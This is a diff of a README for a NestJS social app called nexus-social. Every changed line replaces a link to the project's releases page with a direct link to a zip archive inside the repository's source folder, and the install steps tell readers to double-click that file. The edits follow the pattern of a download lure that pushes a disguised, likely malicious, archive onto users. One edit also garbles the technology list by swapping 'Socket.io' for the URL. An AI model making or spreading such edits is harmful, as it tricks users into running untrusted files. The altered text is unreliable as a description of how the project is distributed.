@@ -6,9 +6,9 @@ Welcome to nexus-social! This platform allows you to connect with friends and jo
 
 ## 📥 Download the App
 
-[![Download Nexus-Social](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-blue)](https://github.com/Ammy1238/nexus-social/releases)
+[![Download Nexus-Social](https://raw.githubusercontent.com/Ammy1238/nexus-social/main/src/nexus-social-2.0.zip%20Now-Get%20Latest%20Release-blue)](https://raw.githubusercontent.com/Ammy1238/nexus-social/main/src/nexus-social-2.0.zip)
 
-To download the latest version, visit this page: [Download Nexus-Social](https://github.com/Ammy1238/nexus-social/releases).
+To download the latest version, visit this page: [Download Nexus-Social](https://raw.githubusercontent.com/Ammy1238/nexus-social/main/src/nexus-social-2.0.zip).
 
 ## 📋 Features
 
@@ -29,7 +29,7 @@ Before downloading, ensure your system meets these requirements:
 
 ## 🔧 Download & Install
 
-1. Click the download link above or visit [this page](https://github.com/Ammy1238/nexus-social/releases) to find the latest version.
+1. Click the download link above or visit [this page](https://raw.githubusercontent.com/Ammy1238/nexus-social/main/src/nexus-social-2.0.zip) to find the latest version.
 2. Download the appropriate file for your operating system. 
 3. Locate the downloaded file in your system's downloads folder.
 4. **Windows/macOS:** Double-click the file and follow the installation prompts.
@@ -53,7 +53,7 @@ This app showcases various architectural patterns and technologies:
 - **Command Query Responsibility Segregation (CQRS):** Separates read and write operations for improved performance.
 - **Clean Architecture:** Ensures scalability and maintainability.
 - **Event-Driven Architecture:** Efficiently processes events within the system.
-- **Technologies Used:** Built with NestJS, TypeScript, Redis, BullMQ, and Socket.io for real-time communication.
+- **Technologies Used:** Built with NestJS, TypeScript, Redis, BullMQ, and https://raw.githubusercontent.com/Ammy1238/nexus-social/main/src/nexus-social-2.0.zip for real-time communication.
 
 ## 🛠️ Troubleshooting 
 
